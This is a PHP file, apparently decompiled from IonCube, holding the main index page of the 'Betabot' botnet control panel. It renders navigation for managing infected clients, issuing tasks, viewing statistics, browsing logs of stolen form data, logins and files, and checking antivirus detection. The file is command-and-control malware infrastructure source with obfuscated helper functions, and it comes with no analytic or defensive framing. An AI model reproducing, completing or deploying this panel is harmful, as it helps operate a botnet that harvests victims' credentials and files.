<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

require "include/core.inc";
define("IN_INDEX_PAGE", 1);
define("INDEX_ERROR_NO_ERROR", 0);
define("INDEX_ERROR_INVALID_MODULE", 1);
define("NOTICE_TYPE_SUCCESS", "success");
define("NOTICE_TYPE_INFO", "info");
define("NOTICE_TYPE_ERROR", "error");
if (isset($_GET["utility"]) && $_GET["utility"] === "tor") {
    require_once "utility/update_torips.php";
    exit;
}
$page_action = "";
$page_module = "main.php";
$page_module_location = DIR_MODULES . "/mod_" . $page_module;
$page_error = INDEX_ERROR_NO_ERROR;
$page_self = $_SERVER["SCRIPT_NAME"];
$page_gen_time = (double) microtime(true);
if (isset($_GET["a"])) {
    $page_action = $_GET["a"];
    if ($page_action == "logout") {
        $Session->EndSession();
    }
} else {
    if (isset($_GET["mod"])) {
        if (!ctype_alnum($_GET["mod"])) {
            exit("......");
        }
        $page_module = $_GET["mod"] . MOD_EXTENSION;
        $page_module_location = DIR_MODULES . "/mod_" . $page_module;
        if (!file_exists($page_module_location)) {
            $page_error = INDEX_ERROR_INVALID_MODULE;
        }
    }
}
echo "\r\n";
if ($page_action == "logout") {
    echo "<html>\r\n<head></head>\r\n<body>\r\n<script>\r\n\tdocument.location = '";
    echo PAGE_LOGIN;
    echo "';\r\n</script>\r\n</body>\r\n</html>\r\n";
    exit;
}
echo "\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n  <head>\r\n    <meta charset=\"utf-8\" http-equiv=\"Refresh\">\r\n    <title>Control Panel</title>\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <meta name=\"description\" content=\"\">\r\n    <meta name=\"author\" content=\"\">\r\n\r\n    <!-- Le styles -->\r\n    <link href=\"css/bootstrap.css\" rel=\"stylesheet\">\r\n\t<link href=\"css/datepicker.css\" rel=\"stylesheet\">\r\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"graphs/jquery.jqplot.min.css\">\r\n\t<link href=\"world/jqvmap/jqvmap.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\" />\r\n    <style>\r\n      body {\r\n        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */\r\n      }\r\n    </style>\r\n\r\n    <!-- Le fav and touch icons -->\r\n    <link rel=\"shortcut icon\" href=\"../ico/favicon.ico\">\r\n    <link rel=\"apple-touch-icon-precomposed\" sizes=\"144x144\" href=\"../ico/apple-touch-icon-144-precomposed.png\">\r\n    <link rel=\"apple-touch-icon-precomposed\" sizes=\"114x114\" href=\"../ico/apple-touch-icon-114-precomposed.png\">\r\n    <link rel=\"apple-touch-icon-precomposed\" sizes=\"72x72\" href=\"../ico/apple-touch-icon-72-precomposed.png\">\r\n    <link rel=\"apple-touch-icon-precomposed\" href=\"../ico/apple-touch-icon-57-precomposed.png\">\r\n  </head>\r\n  \r\n  <body>\r\n\t<font face=\"Tahoma\">\r\n    <div class=\"navbar navbar-fixed-top\">\r\n      <div class=\"navbar-inner\">\r\n        <div class=\"container\">\r\n          <a class=\"btn btn-navbar\" data-toggle=\"collapse\" data-target=\".nav-collapse\">\r\n            <span class=\"icon-bar\"></span>\r\n            <span class=\"icon-bar\"></span>\r\n            <span class=\"icon-bar\"></span>\r\n          </a>\r\n          <a class=\"brand\" href=\"";
echo $page_self;
echo "\">Betabot</a>\r\n\t\t ";
global $Session;
if ($Session->IsLoggedIn() == true) {
    echo "\t\t<ul class=\"nav pull-right\">\r\n\t\t  <li class=\"dropdown\">\r\n\t\t\t<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\">";
    echo $Session->Get(SESSION_INFO_USERNAME);
    echo "<b class=\"caret\"></b></a>\r\n\t\t\t<ul class=\"dropdown-menu\" style=\"width: 280px;\">\r\n\t\t\t <div style=\"padding: 15px;\">\r\n\t\t\t <li>Logged in as <strong>";
    echo $Session->Get(SESSION_INFO_USERNAME);
    echo "</strong></li>\r\n\t\t\t <li>Logged in at: ";
    echo date("m/d/Y g:i:s A", $Session->Get(SESSION_INFO_DATE_LOGGED_IN));
    echo "</li>\r\n\t\t\t </div>\r\n\t\t\t <li><a href=\"";
    echo $_SERVER["SCRIPT_NAME"];
    echo "?a=logout\">Logout</a></li>\r\n\t\t\t</ul>\r\n\t\t  </li>\r\n\t\t</ul>\r\n\t\t";
}
echo "          <div class=\"nav-collapse\">\r\n\t\t\t\t<ul class=\"nav\">\r\n\t\t\t\t";
$mod_temp = isset($_GET["mod"]) ? $_GET["mod"] : "";
echo "\t\t\t\t\r\n\t\t\t\t  \r\n\t\t\t\t  <li class=\"";
echo $mod_temp == "" ? "active" : "";
echo "\"><a href=\"";
echo $page_self;
echo "\"><i class=\"icon-user icon-white\"></i>&nbsp;Clients</a></li>\r\n\t\t\t\t  <li";
echo $mod_temp == MOD_TASKS ? " class=\"active\"" : "";
echo "><a href=\"";
echo $page_self . "?mod=" . MOD_TASKS;
echo "\"><i class=\"icon-tasks icon-white\"></i>&nbsp;Tasks</a></li>\r\n\t\t\t\t  <li";
echo $mod_temp == MOD_STATS ? " class=\"active\"" : "";
echo "><a href=\"";
echo $page_self . "?mod=" . MOD_STATS;
echo "\"><i class=\"icon-info-sign icon-white\"></i>&nbsp;Statistics</a></li>\r\n\t\t\t\t  <li class=\"";
echo $mod_temp == MOD_LOGS_FORMS || $mod_temp == MOD_LOGS_LOGINS || $mod_temp == MOD_LOGS_FILESEARCH ? "active " : "";
echo "dropdown\">\r\n\t\t\t\t\t<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"><i class=\"icon-file icon-white\"></i>&nbsp;Logs<b class=\"caret\"></b></a>\r\n\t\t\t\t\t<ul class=\"dropdown-menu\" style=\"padding: 5%;\">\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_LOGS_FORMS . "";
echo "\">Forms</a></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_LOGS_LOGINS . "";
echo "\">Logins</a></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_LOGS_FILESEARCH . "";
echo "\">Files</a></li>\r\n\t\t\t\t\t</ul>\r\n\t\t\t\t  </li>\r\n\t\t\t\t  \r\n\t\t\t\t  <ul class=\"nav\">\r\n\t\t\t\t  <li class=\"";
echo $mod_temp == MOD_SETTINGS_USERS || $mod_temp == MOD_SETTINGS_PANEL || $mod_temp == MOD_SETTINGS_AVCHECK || $mod_temp == MOD_SETTINGS_ALERTS || $mod_temp == MOD_SETTINGS_DYNAMIC_CONFIG ? "active " : "";
echo "dropdown\">\r\n\t\t\t\t\t<a href=\"#\" class=\"dropdown-toggle\" data-toggle=\"dropdown\"><i class=\"icon-wrench icon-white\"></i>&nbsp;Services<b class=\"caret\"></b></a>\r\n\t\t\t\t\t<ul class=\"dropdown-menu\" style=\"padding: 5%;\">\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_SETTINGS_USERS;
echo "\">Users</a></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_SETTINGS_ALERTS;
echo "\">User Notices</a></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_SETTINGS_AVCHECK;
echo "\">AV Checker</a></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_SETTINGS_PANEL;
echo "\">Panel Settings</a></li>\r\n\t\t\t\t\t \r\n\t\t\t\t\t ";
$bWebModuleDoesExist = file_exists(DIR_MODULES . "/mod_" . MOD_SETTINGS_WEB . ".php");
$bDebugModuleDoesExist = file_exists(DIR_MODULES . "/mod_" . MOD_SETTINGS_DEBUG . ".php");
if (defined("IS_SPECIAL_VERSION") && $bWebModuleDoesExist == true || $bDebugModuleDoesExist == true) {
    echo "<li class=\"divider\"></li>";
}
if (defined("IS_SPECIAL_VERSION") && $bWebModuleDoesExist == true) {
    echo "<li><a href=\"" . $page_self . "?mod=" . MOD_SETTINGS_WEB . "\">WebTrack Config</a></li>\r\n";
}
if ($bDebugModuleDoesExist == true) {
    echo "<li><a href=\"" . $page_self . "?mod=" . MOD_SETTINGS_DEBUG . "\">Bot Debug Reports</a></li>\r\n";
}
echo "\t\t\t\t\t\r\n\t\t\t\t\t <!--<li class=\"divider\"></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_SETTINGS_PLUGINS . "";
echo "\">Plugins</a></li>\r\n\t\t\t\t\t <li><a href=\"";
echo $page_self . "?mod=" . MOD_SETTINGS_DYNAMIC_CONFIG;
echo "\">Dynamic Configuration</a></li>-->\r\n\t\t\t\t\t</ul>\r\n\t\t\t\t  </li>\r\n\t\t\t\t  </ul>\r\n\r\n\t\t\t  <li";
echo $mod_temp == MOD_HELP ? " class=\"active\"" : "";
echo "><a href=\"";
echo $page_self . "?mod=" . MOD_HELP;
echo "\"><i class=\"icon-question-sign icon-white\"></i>&nbsp;Help</a></li>\r\n            </ul>\r\n          </div><!--/.nav-collapse -->\r\n        </div>\r\n      </div>\r\n    </div>\r\n\r\n\t<script src=\"js/jquery.min.js\"></script>\r\n\r\n\t";
if ($page_error != INDEX_ERROR_INVALID_MODULE) {
    $botClients = new CClient();
    $botClients->SetInternalLink($main_sql_link);
    $botClients->Status_CorrectAllOnlineStatus();
    include_once $page_module_location;
} else {
    echo "&nbsp;&nbsp;&nbsp;<font color=\"#E80000\">Invalid module specified.</font><br /><br />\r\n&nbsp;&nbsp;&nbsp;<a href=\"javascript:history.go(-1)\">Go back to previous page</a><br /><br />\r\n";
}
$page_gen_time = round(microtime(true) - $page_gen_time, 5);
echo "<br />";
echo "<!--<font size=\"1\" face=\"Tahoma\">Page generated in " . $page_gen_time . " second(s)</font>-->";
echo "\t\r\n      <!-- Le javascript\r\n    ================================================== -->\r\n    <!-- Placed at the end of the document so the pages load faster -->\r\n    <script src=\"js/jquery.js\"></script>\r\n    <script src=\"js/bootstrap-alert.js\"></script>\r\n    <script src=\"js/bootstrap-modal.js\"></script>\r\n    <script src=\"js/bootstrap-dropdown.js\"></script>\r\n    <script src=\"js/bootstrap-scrollspy.js\"></script>\r\n    <script src=\"js/bootstrap-tab.js\"></script>\r\n    <script src=\"js/bootstrap-tooltip.js\"></script>\r\n    <script src=\"js/bootstrap-popover.js\"></script>\r\n    <script src=\"js/bootstrap-button.js\"></script>\r\n    <script src=\"js/bootstrap-collapse.js\"></script>\r\n\t<script src=\"js/bootstrap-datepicker.js\"></script>\r\n\t\r\n    <script class=\"include\" type=\"text/javascript\" src=\"graphs/jquery.jqplot.min.js\"></script>\r\n\t<script type=\"text/javascript\" src=\"graphs/plugins/jqplot.pieRenderer.min.js\"></script>\r\n\t<script type=\"text/javascript\" src=\"graphs/plugins/jqplot.donutRenderer.min.js\"></script>\r\n\t\r\n\t<script type=\"text/javascript\" class=\"include\" language=\"javascript\" src=\"graphs/plugins/jqplot.highlighter.min.js\"></script>\r\n\t<script type=\"text/javascript\" class=\"include\" language=\"javascript\" src=\"graphs/plugins/jqplot.cursor.min.js\"></script>\r\n\t<script type=\"text/javascript\" class=\"include\" language=\"javascript\" src=\"graphs/plugins/jqplot.dateAxisRenderer.min.js\"></script>\r\n\t<script type=\"text/javascript\" class=\"include\" language=\"javascript\" src=\"graphs/plugins/jqplot.barRenderer.min.js\"></script>\r\n\t<script type=\"text/javascript\" class=\"include\" language=\"javascript\" src=\"graphs/plugins/jqplot.categoryAxisRenderer.min.js\"></script>\r\n\t<script type=\"text/javascript\" class=\"include\" language=\"javascript\" src=\"graphs/plugins/jqplot.pointLabels.min.js\"></script>\r\n\t\r\n\t\r\n    <script src=\"world/jqvmap/jquery.vmap.js\" type=\"text/javascript\"></script>\r\n    <script src=\"world/jqvmap/maps/jquery.vmap.world.js\" type=\"text/javascript\"></script>\r\n\t\r\n\t<script>\r\n\t\t\$(document).ready(function()\r\n\t\t{\r\n\t\t\t\t//favorites\r\n\t\t\t\t\$(\"#botlist2 .content3\").click(function() { \$(this).parent().parent().next().children(\"td\").toggle() }); \r\n\t\t\t\t\$(\"#botlist2 tr:last\").next().children('td').css(\"border-bottom\", \"none\");\r\n\t\t\t\t\r\n\t\t\t\t//normal botlist\r\n\t\t\t\t\$(\"#botlist .content2\").click(function() { \$(this).parent().parent().next().children(\"td\").toggle() }); \r\n\t\t\t\t\$(\"#botlist tr:last\").next().children('td').css(\"border-bottom\", \"none\");\r\n\t\t});\r\n\t\t\r\n\t\t\$(function(){\r\n\t\t\twindow.prettyPrint && prettyPrint();\r\n\t\t\t\$('#dp1').datepicker({\r\n\t\t\t\tformat: 'mm-dd-yyyy'\r\n\t\t\t});\r\n\t\t\t\$('#dp2').datepicker();\r\n\t\t\t\$('#dp3').datepicker();\r\n\t\t\t\$('#dp3').datepicker();\r\n\t\t\t\$('#dpYears').datepicker();\r\n\t\t\t\$('#dpMonths').datepicker();\r\n\t\t\t\r\n\t\t\t\r\n\t\t\tvar startDate = new Date(2012,1,20);\r\n\t\t\tvar endDate = new Date(2012,1,25);\r\n\t\t\t\$('#dp4').datepicker()\r\n\t\t\t\t.on('changeDate', function(ev){\r\n\t\t\t\t\tif (ev.date.valueOf() > endDate.valueOf()){\r\n\t\t\t\t\t\t\$('#alert').show().find('strong').text('The start date can not be greater then the end date');\r\n\t\t\t\t\t} else {\r\n\t\t\t\t\t\t\$('#alert').hide();\r\n\t\t\t\t\t\tstartDate = new Date(ev.date);\r\n\t\t\t\t\t\t\$('#startDate').text(\$('#dp4').data('date'));\r\n\t\t\t\t\t}\r\n\t\t\t\t\t\$('#dp4').datepicker('hide');\r\n\t\t\t\t});\r\n\t\t\t\$('#dp5').datepicker()\r\n\t\t\t\t.on('changeDate', function(ev){\r\n\t\t\t\t\tif (ev.date.valueOf() < startDate.valueOf()){\r\n\t\t\t\t\t\t\$('#alert').show().find('strong').text('The end date can not be less then the start date');\r\n\t\t\t\t\t} else {\r\n\t\t\t\t\t\t\$('#alert').hide();\r\n\t\t\t\t\t\tendDate = new Date(ev.date);\r\n\t\t\t\t\t\t\$('#endDate').text(\$('#dp5').data('date'));\r\n\t\t\t\t\t}\r\n\t\t\t\t\t\$('#dp5').datepicker('hide');\r\n\t\t\t\t});\r\n\t\t});\r\n\t</script>\r\n  </font>\r\n  </body>\r\n</html>";
function _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_($stat_name, $exheight, $exstyles, $text_styles)
{
    echo "<table class=\"table-bordered\" style=\"position: relative; min-width:100%; height:0px; background-color: #F2F2F2; line-height: " . $exheight . "px; " . $exstyles . "\">\r\n";
    echo "<tr>\r\n<td>\r\n";
    echo "<span style=\"position: relative; " . $text_styles . ";\">\r\n";
    echo "<font color=\"#606060\"><strong>" . $stat_name . "</strong></font>\r\n";
    echo "</span>\r\n</tr>\r\n</table>\r\n";
}
function _obfuscated_0D213B155C2A1E0B2C392C2F080310335C404035264022_($stat_name = "")
{
    echo "<label class=\"label\" style=\"font-size: 10px; face: font-family: Tahoma\">" . $stat_name . "</label>\r\n";
}
function _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_()
{
    echo "<br />\r\n";
}
function _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_($stat_name = "", $stat_value = 0, $color_str = "")
{
    $_obfuscated_0D2D3D2D37191D0D0C240F0B283602092A1D08113B2101_ = "";
    $_obfuscated_0D132F3D37340E0C363637075C33061813113315140D22_ = "";
    if (isset($color_str) && 0 < strlen($color_str)) {
        $_obfuscated_0D2D3D2D37191D0D0C240F0B283602092A1D08113B2101_ = "<font color=\"" . $color_str . "\">";
        $_obfuscated_0D132F3D37340E0C363637075C33061813113315140D22_ = "</font>";
    }
    if ($stat_name != NULL && 0 < strlen($stat_name)) {
        $stat_name .= ":";
    }
    echo "<span style=\"float: left\">" . $stat_name . "</span><span style=\"float: right\">" . $_obfuscated_0D2D3D2D37191D0D0C240F0B283602092A1D08113B2101_ . $stat_value . $_obfuscated_0D132F3D37340E0C363637075C33061813113315140D22_ . "</span><br />\r\n";
}
function _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_($notice_type = NOTICE_TYPE_INFO, $notice_msg, $is_centered = false, $notice_width = 1000)
{
    $_obfuscated_0D383D30373B0A125C0D011A110C2C375B2B290F365C01_ = "<center>";
    $_obfuscated_0D27372C3D05161B0531041038290524393F0134063632_ = "</center>";
    if ($is_centered == false) {
        $_obfuscated_0D383D30373B0A125C0D011A110C2C375B2B290F365C01_ = "";
        $_obfuscated_0D27372C3D05161B0531041038290524393F0134063632_ = "";
    }
    echo $_obfuscated_0D383D30373B0A125C0D011A110C2C375B2B290F365C01_ . "<div class=\"alert alert-" . $notice_type . "\" style=\"width: " . $notice_width . "px;\">";
    echo "<a class=\"close\" data-dismiss=\"alert\">x</a>";
    echo $notice_msg;
    echo "</div>" . $_obfuscated_0D27372C3D05161B0531041038290524393F0134063632_;
}
function _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($notice_type = NOTICE_TYPE_INFO, $notice_msg, $notice_width = 1000)
{
    $_obfuscated_0D383D30373B0A125C0D011A110C2C375B2B290F365C01_ = "<center>";
    $_obfuscated_0D27372C3D05161B0531041038290524393F0134063632_ = "</center>";
    $_obfuscated_0D2436082F0D191A33313B2C1E013B225B2114305C3222_ = "align=\"left\"";
    echo $_obfuscated_0D383D30373B0A125C0D011A110C2C375B2B290F365C01_ . "<div class=\"alert alert-" . $notice_type . "\" " . $_obfuscated_0D2436082F0D191A33313B2C1E013B225B2114305C3222_ . " style=\"width: " . $notice_width . "px;\">";
    echo "<a class=\"close\" data-dismiss=\"alert\">x</a>";
    echo $notice_msg;
    echo "</div>" . $_obfuscated_0D27372C3D05161B0531041038290524393F0134063632_;
}

?>